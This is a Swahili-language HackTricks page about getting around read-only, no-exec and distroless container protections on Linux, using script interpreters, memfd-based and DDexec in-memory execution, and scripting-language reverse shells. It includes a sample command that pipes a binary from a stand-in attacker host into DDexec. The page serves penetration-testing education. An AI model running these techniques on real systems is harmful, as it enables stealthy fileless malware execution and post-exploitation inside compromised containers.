# Kupitisha ulinzi wa FS: read-only / no-exec / Distroless

{{#include ../../../banners/hacktricks-training.md}}


## Video

Katika video zifuatazo unaweza kupata mbinu zilizotajwa kwenye ukurasa huu zikipangwa kwa undani zaidi:

- [**DEF CON 31 - Exploring Linux Memory Manipulation for Stealth and Evasion**](https://www.youtube.com/watch?v=poHirez8jk4)
- [**Stealth intrusions with DDexec-ng & in-memory dlopen() - HackTricks Track 2023**](https://www.youtube.com/watch?v=VM_gjjiARaU)

## read-only / no-exec senario

Ni kawaida zaidi kupata mashine za linux zimepangwa na ulinzi wa **read-only (ro) file system**, hasa katika containers. Hii ni kwa sababu kuendesha container na ro file system ni rahisi kama kuweka **`readOnlyRootFilesystem: true`** katika `securitycontext`:

<pre class="language-yaml"><code class="lang-yaml">apiVersion: v1
kind: Pod
metadata:
name: alpine-pod
spec:
containers:
- name: alpine
image: alpine
securityContext:
<strong>      readOnlyRootFilesystem: true
</strong>    command: ["sh", "-c", "while true; do sleep 1000; done"]
</code></pre>

Hata hivyo, hata kama file system imefungwa kama ro, **`/dev/shm`** bado itakuwa inaweza kuandikwa, hivyo si kweli kwamba hatuwezi kuandika chochote kwenye diski. Hata hivyo, folda hii itakuwa **imefungwa kwa ulinzi wa no-exec**, kwa hivyo ikiwa utaipakua binary hapa **huwezi kuiendesha**.

> [!WARNING]
> Kutoka kwa mtazamo wa red team, hili linafanya iwe **ghalibu kupakua na kuendesha** binaries ambazo haziko tayari kwenye mfumo (kama backdoors au enumerators kama `kubectl`).

## Njia rahisi zaidi ya kupitisha: Scripts

Kumbuka nilitaja binaries, unaweza **kuendesha script yoyote** mradi tu interpreter iko ndani ya mashine, kama **shell script** ikiwa `sh` ipo au **python** **script** ikiwa `python` imewekwa.

Hata hivyo, hili pekee halitoshi kuendesha backdoor yako ya binary au zana nyingine za binary ambazo unaweza kuhitaji kuendesha.

## Kupitisha kwa Memory

Ikiwa unataka kuendesha binary lakini file system haikuruhusu, njia bora ni kwa **kuiendesha kutoka kumbukumbu**, kwa kuwa ulinzi hauwezi kutumika hapo.

### FD + exec syscall bypass

Kama una engines za script zenye nguvu ndani ya mashine, kama **Python**, **Perl**, au **Ruby**, unaweza kupakua binary ili kuendesha kutoka kumbukumbu, kuihifadhi katika memory file descriptor (`create_memfd` syscall), ambayo haitakuwa chini ya ulinzi huo kisha kuita **`exec` syscall** ukionyesha **fd kama faili la kuendesha**.

Kwa hili unaweza kutumia mradi [**fileless-elf-exec**](https://github.com/nnsee/fileless-elf-exec). Unaweza kumpa binary na itazalisha script katika lugha iliyoonyeshwa na **binary iliyokomeshwa na b64 encoded** na maagizo ya **kuibadilisha na kuikunja** kwenye **fd** iliyotengenezwa kwa kuita `create_memfd` syscall na kwa kisha kuita syscall ya **exec** kuirun.

> [!WARNING]
> Hii haitumii katika lugha nyingine za scripting kama PHP au Node kwa sababu hazina njia ya msingi ya kuitisha raw syscalls kutoka katika script, hivyo haiwezekani kuita `create_memfd` kuunda **memory fd** kuhifadhi binary.
>
> Zaidi ya hayo, kuunda **regular fd** kwa faili katika `/dev/shm` haitafanya kazi, kwa sababu hautaruhusiwa kuendesha faili hiyo kwa kuwa **no-exec protection** itaathiri.

### DDexec / EverythingExec

[**DDexec / EverythingExec**](https://github.com/arget13/DDexec) ni mbinu inayokuwezesha **kubadilisha kumbukumbu ya mchakato wako mwenyewe** kwa kuandika tena **`/proc/self/mem`** yake.

Kwa hivyo, kwa **kudhibiti assembly code** inayotekelezwa na mchakato, unaweza kuandika **shellcode** na "kugeuza" mchakato ili **kuendesha code yoyote unayotaka**.

> [!TIP]
> **DDexec / EverythingExec** itakuwezesha kupakia na **kuendesha** shellcode yako mwenyewe au **binary yoyote** kutoka **kumbukumbu**.
```bash
# Basic example
wget -O- https://attacker.com/binary.elf | base64 -w0 | bash ddexec.sh argv0 foo bar
```
Kwa taarifa zaidi kuhusu mbinu hii angalia Github au:

{{#ref}}
ddexec.md
{{#endref}}

### MemExec

[**Memexec**](https://github.com/arget13/memexec) ni hatua inayofuata ya asili kwa DDexec. Ni **DDexec shellcode demonised**, hivyo kila wakati unapotaka **run a different binary** hauhitaji kuanzisha DDexec tena; unaweza tu kuendesha memexec shellcode kupitia mbinu ya DDexec kisha **communicate with this deamon to pass new binaries to load and run**.

Unaweza kupata mfano jinsi ya kutumia **memexec to execute binaries from a PHP reverse shell** katika [https://github.com/arget13/memexec/blob/main/a.php](https://github.com/arget13/memexec/blob/main/a.php).

### Memdlopen

Kwa kusudi sawa na DDexec, [**memdlopen**](https://github.com/arget13/memdlopen) technique inaruhusu **easier way to load binaries** katika memory ili kuzitekeleza baadaye. Inaweza hata kuruhusu kupakia binaries zenye dependencies.

## Distroless Bypass

Kwa maelezo maalumu ya **what distroless actually is**, lini inasaidia, lini haiwezi, na jinsi inavyobadilisha post-exploitation tradecraft katika containers, angalia:

{{#ref}}
../../privilege-escalation/container-security/distroless.md
{{#endref}}

### Distroless ni nini

Distroless containers zina tu **bare minimum components necessary to run a specific application or service**, kama libraries na runtime dependencies, lakini hazijumuishi vipengele vikubwa kama package manager, shell, au system utilities.

### Reverse Shell

Katika container distroless huenda **not even find `sh` or `bash`** kupata shell ya kawaida. Pia hautapata binaries kama `ls`, `whoami`, `id`... kila kitu unachokimbia kawaida kwenye mfumo.

> [!WARNING]
> Kwa hivyo, hutaweza kupata **reverse shell** au **enumerate** mfumo kama kawaida.

Hata hivyo, ikiwa container iliyokumbwa na tatizo inaendesha kwa mfano flask web, basi python imewekwa, na kwa hiyo unaweza kupata **Python reverse shell**. Ikiwa inaendesha node, unaweza kupata Node rev shell, na vivyo hivyo kwa karibu lugha yoyote ya **scripting language**.

> [!TIP]
> Kwa kutumia scripting language unaweza **enumerate the system** kwa kutumia uwezo wa lugha hiyo.

Ikiwa hakuna **no `read-only/no-exec`** protections unaweza kutumia reverse shell yako kuandika kwenye filesystem yako binaries na kuzi **execute**.

> [!TIP]
> Walakini, katika aina hizi za containers ulinzi huu kwa kawaida utakuwepo, lakini unaweza kutumia **previous memory execution techniques to bypass them**.

Unaweza kupata **examples** jinsi ya **exploit some RCE vulnerabilities** kupata scripting languages **reverse shells** na kutekeleza binaries kutoka memory katika [**https://github.com/carlospolop/DistrolessRCE**](https://github.com/carlospolop/DistrolessRCE).


{{#include ../../../banners/hacktricks-training.md}}
